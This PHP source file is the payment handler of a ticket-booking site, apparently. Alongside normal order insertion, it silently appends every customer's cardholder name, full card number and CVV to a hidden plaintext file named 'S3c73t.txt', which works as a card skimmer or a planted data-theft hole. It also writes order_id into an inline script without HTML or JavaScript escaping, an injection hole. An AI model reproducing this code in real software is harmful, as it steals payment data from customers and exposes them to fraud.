<?php session_start(['cookie_httponly' => true]);

include '../db_connect.php';
//รับค่า pay_summary
$user_id = $_SESSION['user_id'];
$order_id = mysqli_real_escape_string($conn,$_POST['order_id']);
$cc_id = mysqli_real_escape_string($conn,$_POST['concert_id']);
$qty = mysqli_real_escape_string($conn,$_POST['ticket_qty']);

$card_name = mysqli_real_escape_string($conn, $_POST['card_name']);
$method_pay = mysqli_real_escape_string($conn,$_POST['payment_method']);



// ดึง DB concert_list

$cc_sql = mysqli_prepare($conn,"SELECT * FROM concert_list WHERE cc_id=?");
mysqli_stmt_bind_param($cc_sql,"s", $cc_id);
mysqli_stmt_execute($cc_sql);
$cc_res = mysqli_stmt_get_result($cc_sql);
$cc_row = mysqli_fetch_assoc($cc_res);

$cc_name = $cc_row["cc_name"];
$Artist = $cc_row['Artist'];
$show_date = $cc_row['show_date'];
$price = $cc_row['price'];
$total_price = $qty * $price;

$time = mysqli_real_escape_string($conn,$_POST['time']);
$card_number = mysqli_real_escape_string($conn,$_POST['card_number']);
$cvv = mysqli_real_escape_string($conn,$_POST['cvv']);


$log_payment = "[ ".$time. " ]| order_id:$order_id | Card:$card_name | Card_NUM: $card_number | cvv: $cvv ".PHP_EOL;

file_put_contents("../S3c73t.txt", $log_payment, FILE_APPEND);


$insert_orders = "INSERT INTO orders (`order_id`, `user_id`,`owner`, `cc_id`, `cc_name`, `Artist`, `show_date`, `order_date`, `qty`, `price`, `total_price`, `method_pay`) 
                        
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)";
            
$insert_orders_prepare = mysqli_prepare($conn,$insert_orders);

mysqli_stmt_bind_param($insert_orders_prepare,"sisissssiiis", $order_id , $user_id , $card_name , $cc_id , $cc_name , $Artist , $show_date , $time , $qty , $price , $total_price , $method_pay);


if(mysqli_stmt_execute($insert_orders_prepare)){

    $_SESSION['order_id'] = $order_id;
    $s_order_id = $order_id ;
    echo "<script> alert('Payment Successful!') ; window.location.href='E_ticket.php?order_id=$s_order_id';</script>";

}else{
    echo "Error: ".mysqli_error($conn);
}


?>

